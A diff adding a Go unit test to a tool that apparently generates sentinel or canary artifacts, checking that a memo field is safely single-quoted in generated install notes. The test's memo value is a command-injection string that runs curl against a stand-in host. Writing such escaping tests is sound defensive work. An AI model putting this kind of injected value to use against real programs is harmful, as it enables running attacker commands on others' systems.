@@ -3,6 +3,7 @@ package forge_test
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/jimididit/kunari/internal/forge"
@@ -59,5 +60,30 @@ func TestForgeSVG(t *testing.T) {
 	})
 	if err != nil {
 		t.Fatal(err)
+	}
+}
+
+func TestInstallNotesQuoteMemoAgainstShell(t *testing.T) {
+	dir := t.TempDir()
+	memo := "lab; $(curl evil.test) 'x'"
+	res, err := forge.Run(forge.Options{
+		Type: "env", Name: "secrets", Detect: "sentinel",
+		Memo: memo, AuthzRef: "LAB-1",
+		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	body, err := os.ReadFile(res.InstallPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	text := string(body)
+	if strings.Contains(text, `--memo "`) {
+		t.Fatal("memo must use POSIX single quotes, not Go/double quotes")
+	}
+	want := "--memo '" + strings.ReplaceAll(memo, "'", `'\''`) + "'"
+	if !strings.Contains(text, want) {
+		t.Fatalf("want %q in install notes; got:\n%s", want, text)
 	}
 }
